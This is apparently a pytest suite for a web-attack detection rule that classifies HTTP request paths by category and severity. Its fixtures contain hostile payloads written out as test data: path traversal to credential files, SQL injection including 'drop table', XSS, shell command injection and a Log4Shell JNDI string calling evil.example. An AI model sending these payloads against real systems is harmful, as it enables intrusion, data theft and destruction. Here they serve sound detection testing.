"""Unit tests for backend/detection/web_paths.py.

Uses the real models (Event / EventIn / AlertIn) so tests also prove that
every candidate the rule produces is a valid AlertIn.
"""

import json
import logging
import time
from datetime import datetime, timezone
from types import SimpleNamespace

import pytest

from backend.detection import web_paths
from backend.detection.web_paths import DEFAULT_WEB_PATH_PATTERNS, RULE_NAME, evaluate, inspect_path, normalize_path
from backend.models import MAX_EXPLANATION_BYTES, MAX_TITLE_LEN, AlertIn, Event, EventIn

NOW = datetime(2026, 10, 19, 9, 0, tzinfo=timezone.utc)


def make_event(path="/", *, id=1, ip="198.51.100.23", method="GET", status=None, etype="http_request", **extra):
    """Build a stored http_request Event; tests only state what matters."""
    kwargs = dict(
        id=id, received_at=NOW, type=etype, timestamp=NOW, source="webapp-1", src_ip=ip,
    )
    if etype == "http_request":
        kwargs.update(http_method=method, http_path=path, http_status=status)
    kwargs.update(extra)
    return Event(**kwargs)


def categories(path, settings=None):
    return {m["category"] for m in inspect_path(path, settings)[1]}


# ---------------------------------------------------------------------------
# Should NOT fire
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "path",
    [
        "/",
        "/index.html",
        "/about-us",
        "/products/123",
        "/api/v1/users/42/orders",
        "/static/js/app.min.js",
        "/images/logo.png",
        "/blog/union-station-selects-new-chief",  # contains 'union' and 'select' but no SQL shape
        "/blog/sleep-5-tips-for-better-rest",  # 'sleep' followed by a hyphen, not a call
        "/blog/how-to-use-the-environment-variable",  # '.env'-like text without the dot-file form
        "/downloads/report..final.pdf",  # '..' inside a filename, not a path segment
        "/docs/javascript-basics",  # 'javascript' without ':'
        "/tags/c++",  # '+' becomes a space during matching
        "/users/1;jsessionid=ABC123",  # ';' followed by something that is not a command
        "/a;idea",  # ';id' prefix of a longer word must not match
        "/products/ab--select-case",  # '--' not followed by whitespace
    ],
)
def test_clean_paths_do_not_fire(path):
    assert evaluate(make_event(path)) is None


def test_non_http_events_return_none():
    dns = make_event(etype="dns_query", dns_name="example.com")
    assert evaluate(dns) is None
    auth = make_event(etype="auth_failure", username="alice")
    assert evaluate(auth) is None


def test_event_without_path_returns_none():
    assert evaluate(SimpleNamespace(type="http_request", http_path=None)) is None
    assert evaluate(SimpleNamespace(type="http_request", http_path="")) is None
    assert evaluate(SimpleNamespace(type="http_request")) is None


def test_query_string_attacks_are_invisible_by_design():
    """models.EventIn strips '?query' before storage, so these must NOT fire."""
    ev = make_event("/products?id=1' OR '1'='1")
    assert ev.http_path == "/products"
    assert evaluate(ev) is None
    ev = make_event("/search?q=<script>alert(1)</script>")
    assert ev.http_path == "/search"
    assert evaluate(ev) is None


# ---------------------------------------------------------------------------
# Should fire: one per category, plus encoding evasion
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "path, category",
    [
        ("/download/../../etc/passwd", "path_traversal"),
        ("/files/%2e%2e/%2e%2e/etc/shadow", "path_traversal"),  # percent-encoded
        ("/%252e%252e/%252e%252e/secret", "path_traversal"),  # double-encoded
        ("/%25252e%25252e/x", "path_traversal"),  # triple-encoded
        ("/..\\..\\windows\\win.ini", "path_traversal"),  # backslashes
        ("/%u002e%u002e/%u002e%u002e/boot.ini", "path_traversal"),  # IIS unicode
        ("/static/..;/admin", "path_traversal"),  # tomcat style ..;/
        ("/proc/self/environ", "path_traversal"),
        ("/.env", "sensitive_file"),
        ("/.ENV", "sensitive_file"),  # case-insensitive
        ("/.env.production", "sensitive_file"),
        ("/.git/config", "sensitive_file"),
        ("/wp-config.php.bak", "sensitive_file"),
        ("/backup/site.sql", "sensitive_file"),
        ("/.ssh/id_rsa", "sensitive_file"),
        ("/phpmyadmin/", "admin_panel_probe"),
        ("/wp-login.php", "admin_panel_probe"),
        ("/manager/html", "admin_panel_probe"),
        ("/actuator/heapdump", "admin_panel_probe"),
        ("/items/1' or '1'='1", "sql_injection"),
        ("/items/1%27%20or%201%3D1--", "sql_injection"),  # encoded
        ("/items/1 union select name from users", "sql_injection"),
        ("/items/1+union+all+select+null", "sql_injection"),  # '+' as space
        ("/items/1;drop table users", "sql_injection"),
        ("/items/1 and sleep(5)", "sql_injection"),
        ("/q/information_schema.tables", "sql_injection"),
        ("/search/<script>alert(1)</script>", "xss"),
        ("/%3Cscript%3Ealert(1)%3C/script%3E", "xss"),  # encoded
        ("/%EF%BC%9Cscript%EF%BC%9Ealert(1)", "xss"),  # full-width '<script>'
        ("/img/x onerror=alert(1)", "xss"),
        ("/redirect/javascript:alert(1)", "xss"),
        ("/ping/127.0.0.1;cat /etc/passwd", "command_injection"),
        ("/run/x|whoami", "command_injection"),
        ("/x/${jndi:ldap://evil.example/a}", "command_injection"),
        ("/cgi/() { :;}; /bin/bash -c id", "command_injection"),
    ],
)
def test_attack_paths_fire(path, category):
    alert = evaluate(make_event(path))
    assert alert is not None, path
    assert category in alert.explanation["matched_categories"], (path, alert.explanation["matched_categories"])


def test_null_byte_truncation_trick_is_neutralised():
    assert "path_traversal" in categories("/a/../b%00.png")


# ---------------------------------------------------------------------------
# Severity and multi-category behaviour
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "path, severity",
    [
        ("/phpmyadmin/", "medium"),
        ("/.env", "high"),
        ("/download/../../etc/passwd", "high"),
        ("/items/1 union select x", "high"),
        ("/x/${jndi:ldap://evil.example/a}", "critical"),
    ],
)
def test_severity_comes_from_category(path, severity):
    assert evaluate(make_event(path)).severity == severity


def test_multiple_categories_use_highest_severity_and_list_all():
    alert = evaluate(make_event("/ping/127.0.0.1;cat /etc/passwd"))
    cats = alert.explanation["matched_categories"]
    assert "command_injection" in cats and "path_traversal" in cats
    assert alert.severity == "critical"  # command_injection outranks path_traversal (high)


# ---------------------------------------------------------------------------
# Candidate shape: AlertIn validity, explanation, evidence, title
# ---------------------------------------------------------------------------
def test_candidate_is_valid_alertin_with_expected_fields():
    alert = evaluate(make_event("/.env", id=42, ip="203.0.113.9", status=200))
    assert isinstance(alert, AlertIn)
    assert alert.rule == RULE_NAME == "web_paths"
    assert alert.src_ip == "203.0.113.9"
    assert alert.evidence_event_ids == [42]
    ex = alert.explanation
    assert ex["threshold"] == 1
    assert ex["observed_count"] >= 1
    assert ex["http_method"] == "GET" and ex["http_status"] == 200
    assert ex["path"] == "/.env"
    assert ex["matches"] and {"category", "pattern", "matched_text"} <= set(ex["matches"][0])
    json.dumps(ex)  # JSON-serialisable


def test_event_without_id_gives_empty_evidence():
    ev = EventIn(type="http_request", source="webapp-1", src_ip="198.51.100.23",
                 http_method="GET", http_path="/.env")
    alert = evaluate(ev)
    assert alert is not None and alert.evidence_event_ids == []


def test_title_has_labels_but_never_the_request_path():
    alert = evaluate(make_event("/search/<script>alert(1)</script>"))
    assert "198.51.100.23" in alert.title
    assert "cross-site scripting" in alert.title
    assert "<script" not in alert.title
    assert len(alert.title) <= MAX_TITLE_LEN


def test_explanation_stays_within_size_limit_for_hostile_long_paths():
    path = "/" + "../etc/passwd/" * 140  # ~2000 chars, matches many patterns
    path = path[:2048]
    alert = evaluate(make_event(path))
    assert alert is not None
    assert len(json.dumps(alert.explanation).encode()) <= MAX_EXPLANATION_BYTES
    assert len(alert.explanation["path"]) <= 200


def test_recent_events_argument_is_ignored():
    ev = make_event("/.env")
    assert evaluate(ev, recent_events=None) is not None
    assert evaluate(ev, recent_events=[make_event("/x"), make_event("/y")]) is not None


# ---------------------------------------------------------------------------
# normalize_path
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "raw, expected",
    [
        ("/A/B", "/a/b"),
        ("/a//b///c", "/a/b/c"),
        ("/a/./b/./c", "/a/b/c"),
        ("/a\\b\\c", "/a/b/c"),
        ("/a+b", "/a b"),
        ("/%2e%2e/x", "/../x"),
        ("/%252e%252e/x", "/../x"),
        ("/%u002e%u002e/x", "/../x"),
        ("/a%00b", "/ab"),
        ("/%EF%BC%9Cscript%EF%BC%9E", "/<script>"),
        ("", ""),
        (None, ""),
    ],
)
def test_normalize_path(raw, expected):
    assert normalize_path(raw) == expected


def test_normalize_path_is_bounded_and_fast_on_hostile_input():
    hostile = "%25" * 700 + "/" * 700 + "%u" * 400  # ~2000 chars
    start = time.perf_counter()
    out = normalize_path(hostile)
    assert time.perf_counter() - start < 0.2
    assert len(out) <= web_paths.MAX_NORMALIZED_LEN


def test_non_string_input_does_not_crash():
    assert normalize_path(12345) == ""
    assert inspect_path(["x"]) == ("", [])


# ---------------------------------------------------------------------------
# Settings: overrides, disabled categories, bad config
# ---------------------------------------------------------------------------
CUSTOM = {"secret_area": {"severity": "critical", "label": "secret area", "patterns": [r"^/internal-only(?:/|$)"]}}


def test_settings_patterns_replace_defaults_object_style():
    settings = SimpleNamespace(web_path_patterns=CUSTOM)
    alert = evaluate(make_event("/internal-only/data"), settings=settings)
    assert alert.severity == "critical"
    assert alert.explanation["matched_categories"] == ["secret_area"]
    assert evaluate(make_event("/.env"), settings=settings) is None  # defaults replaced


def test_settings_accept_mapping_and_uppercase_names():
    assert evaluate(make_event("/internal-only"), settings={"web_path_patterns": CUSTOM}) is not None
    assert evaluate(make_event("/internal-only"), settings={"WEB_PATH_PATTERNS": CUSTOM}) is not None


def test_disabled_categories_are_skipped():
    settings = SimpleNamespace(web_path_disabled_categories=["admin_panel_probe"])
    assert evaluate(make_event("/wp-login.php"), settings=settings) is None
    assert evaluate(make_event("/.env"), settings=settings) is not None  # others still active


def test_disabled_categories_accepts_a_single_string_and_any_case():
    settings = {"web_path_disabled_categories": "Admin_Panel_Probe"}
    assert evaluate(make_event("/wp-login.php"), settings=settings) is None


def test_invalid_regex_is_skipped_without_crashing(caplog):
    bad = {"c": {"severity": "high", "patterns": ["([unclosed", r"^/ok$"]}}
    with caplog.at_level(logging.WARNING):
        alert = evaluate(make_event("/ok"), settings={"web_path_patterns": bad})
    assert alert is not None  # the valid pattern still works
    assert any("invalid pattern" in r.message for r in caplog.records)


def test_invalid_severity_falls_back_to_medium():
    cfg = {"c": {"severity": "catastrophic", "patterns": [r"^/x$"]}}
    assert evaluate(make_event("/x"), settings={"web_path_patterns": cfg}).severity == "medium"


def test_non_mapping_patterns_setting_falls_back_to_defaults():
    assert evaluate(make_event("/.env"), settings={"web_path_patterns": ["nope"]}) is not None


def test_settings_none_uses_defaults():
    assert evaluate(make_event("/.env"), settings=None) is not None


# ---------------------------------------------------------------------------
# Defaults sanity
# ---------------------------------------------------------------------------
def test_default_patterns_are_all_valid_and_use_known_severities():
    from backend.models import SEVERITIES
    import re
    for name, cfg in DEFAULT_WEB_PATH_PATTERNS.items():
        assert cfg["severity"] in SEVERITIES, name
        assert cfg["patterns"], name
        for pat in cfg["patterns"]:
            re.compile(pat, re.IGNORECASE)


def test_throughput_is_reasonable():
    events = [make_event(p, id=i + 1) for i, p in enumerate(["/", "/products/1", "/.env", "/a/../b"] * 250)]
    start = time.perf_counter()
    for ev in events:
        evaluate(ev)
    assert time.perf_counter() - start < 2.0  # 1000 events